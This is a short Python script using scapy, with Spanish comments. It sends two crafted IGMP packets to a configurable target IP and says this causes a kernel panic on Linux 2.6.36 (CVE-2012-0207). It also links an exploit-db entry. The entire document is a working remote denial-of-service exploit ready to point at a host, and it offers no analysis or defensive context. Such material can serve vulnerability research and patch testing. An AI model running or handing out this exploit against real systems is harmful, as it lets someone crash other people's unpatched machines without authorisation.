# Envia IGMP que genera un Kernel Panic en Linux remoto 2.6.36  
# CVE : CVE-2012-0207
# https://www.exploit-db.com/exploits/18378/
# 
# 
import sys
from scapy.all import *

from struct import pack
from socket import inet_aton

target = "127.0.0.1" # host target IP, change this !!!
a=pack("!BBH",0x11,0xff,0)+inet_aton("224.0.0.1")
b=pack("!BBH",0x11,0x0,0)+inet_aton("0.0.0.0")+pack("!BBBB",0,0,0,0)
a1=a[:2]+pack("!H",checksum(a))+a[4:]
b1=b[:2]+pack("!H",checksum(b))+b[4:]
send(IP(dst=target,proto=2)/a1)
send(IP(dst=target,proto=2)/b1)
